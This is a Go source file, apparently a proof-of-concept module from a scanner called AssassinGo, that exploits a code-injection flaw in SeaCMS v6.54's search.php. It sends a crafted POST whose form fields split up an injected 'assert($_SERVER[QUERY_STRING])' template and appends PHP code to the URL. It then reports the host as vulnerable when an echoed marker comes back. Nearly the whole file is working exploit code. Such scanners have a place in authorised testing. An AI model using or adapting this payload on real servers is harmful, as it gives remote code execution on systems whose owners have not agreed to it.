package poc

import (
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"

	"../logger"
	"github.com/gorilla/websocket"
)

// SeaCMSv654 search.php code injection.
type SeaCMSv654 struct {
	target  string
	Existed string
}

// NewSeaCMSv654 .
func NewSeaCMSv654() *SeaCMSv654 {
	return &SeaCMSv654{}
}

// Set implements POC interface.
// Params should be {target string}
func (s *SeaCMSv654) Set(v ...interface{}) {
	s.target = v[0].(string)
}

// Report implements POC interface.
func (s *SeaCMSv654) Report() interface{} {
	return s.Existed
}

// Run implements POC interface.
func (s *SeaCMSv654) Run(conn *websocket.Conn) {
	logger.Green.Println("Checking SeaCMSv6.54 Vuls...")
	s.check(conn)
}

func (s *SeaCMSv654) check(conn *websocket.Conn) {
	cmd := `?echo"AssassinGooo";`
	payload := url.Values{}
	payload.Add("searchtype", "5")
	payload.Add("searchword", "{if{searchpage:year}")
	payload.Add("year", ":as{searchpage:area}}")
	payload.Add("area", "s{searchpage:letter}")
	payload.Add("letter", "ert{searchpage:lang}")
	payload.Add("yuyan", "($_SE{searchpage:jq}")
	payload.Add("jq", "RVER{searchpage:ver}")
	payload.Add("ver", "[QUERY_STRING]));/*")

	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	req, _ := http.NewRequest("POST", "http://"+s.target+":8888/seacmsv6.54/upload/search.php"+cmd, strings.NewReader(payload.Encode()))

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; AssassinGo/0.1)")
	resp, err := client.Do(req)
	if err != nil {
		logger.Red.Println(err)
		s.Existed = "false"
		return
	}

	body, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if strings.Contains(string(body), "AssassinGooo") {
		s.Existed = "true"

		logger.Blue.Println(s.target)
		ret := map[string]string{
			"host":    s.target,
			"existed": s.Existed,
		}
		conn.WriteJSON(ret)
	}
}